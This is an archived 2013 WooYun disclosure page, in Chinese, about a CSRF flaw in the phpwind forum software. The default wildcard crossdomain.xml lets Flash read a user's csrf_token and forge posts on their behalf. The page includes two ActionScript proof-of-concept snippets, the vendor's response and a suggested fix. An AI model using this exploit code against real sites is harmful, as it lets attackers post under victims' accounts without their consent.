@@ -1,0 +1,224 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpwind配置不当可导致CSRF发帖  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpwind配置不当可导致CSRF发帖  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/p.z">p.z</a> 
+</li><li>提交时间：		2013-09-28 14:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-29：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-09：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-19：	细节向普通白帽子公开<br/>
+									2013-10-29：	细节向实习白帽子公开<br/>
+									2013-11-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">phpwind配置不当可导致CSRF发帖</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">crossdomain.xml的默认设置：<br />
+<br />
+</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;<br />
+-&lt;cross-domain-policy&gt; &lt;allow-access-from domain=&quot;*&quot;/&gt;<br />
+&lt;!-- flash跨域策略，domain建议设置为 *.你的站点域名 --&gt;<br />
+ &lt;/cross-domain-policy&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+虽然有建议 但是普通站长谁没事改这个啊，还不如你们在安装时直接根据host重写下crossdomain.xml得了。<br />
+<br />
+<br />
+<br />
+先取到csrf的token<br />
+<br />
+</p><p class="detail"><a href="../images/281417272339bb55dbba12ebfe356dc5c41e1449.png" target="_blank"><img src="../images/281417272339bb55dbba12ebfe356dc5c41e1449.png" alt="Q.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>function gethash() {<br />
+    function getformhash(txt) {<br />
+        txt = txt.split(&#039;csrf_token&quot; value=&quot;&#039;)[1].split(&#039;&quot;&#039;)[0];<br />
+        return txt;<br />
+    }<br />
+    var result_lv:LoadVars = new LoadVars();<br />
+    result_lv.onData = function(txt) {<br />
+        if (txt) {<br />
+            txt = getformhash(txt);<br />
+        } else {<br />
+            txt = &quot;Error connecting to server.&quot;;<br />
+        }<br />
+        trace(txt);<br />
+    };<br />
+    var send_lv:LoadVars = new LoadVars();<br />
+    method = &#039;GET&#039;;<br />
+    url = &quot;http://localhost:8080/index.php?c=post&amp;fid=2&quot;;<br />
+    send_lv.sendAndLoad(url,result_lv,method);<br />
+}<br />
+gethash()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后csrf发帖 pw这里甚至没有对refer进行检查 可以直接外域提交<br />
+<br />
+</p><p class="detail"><a href="../images/2814210375a9d3ec8d9b214e5d677a3827b2caed.png" target="_blank"><img src="../images/2814210375a9d3ec8d9b214e5d677a3827b2caed.png" alt="Q57.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>function dopost() {<br />
+    var result_lv:LoadVars = new LoadVars();<br />
+    result_lv.onData = function(txt) {<br />
+        trace(txt);<br />
+    };<br />
+    var send_lv:LoadVars = new LoadVars();<br />
+    method = &#039;post&#039;;<br />
+    url = &quot;http://localhost:8080/index.php?c=post&amp;a=doadd&amp;_json=1&amp;fid=2&quot;;<br />
+    send_lv[&#039;csrf_token&#039;] = &#039;{{ csrf_token }}&#039;;<br />
+    send_lv[&#039;atc_title&#039;] = &#039;1380343694&#039;;<br />
+    send_lv[&#039;atc_content&#039;] = &#039;12112123123sdf1&#039;;<br />
+    send_lv[&#039;pid&#039;] = &#039;&#039;;<br />
+    send_lv[&#039;tid&#039;] = &#039;&#039;;<br />
+    send_lv[&#039;special&#039;] = &#039;default&#039;;<br />
+    send_lv.sendAndLoad(url,result_lv,method);<br />
+}<br />
+dopost()</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">删了那个文件吧，或者重写吧，千万不要让他站在敌人的那一边。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/p.z" title="p.z">p.z</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-038432" title="phpwind配置不当可导致CSRF发帖">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-09-29 16:31</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你对我们的支持与关注，该问题我们正在修复~</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="38432";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
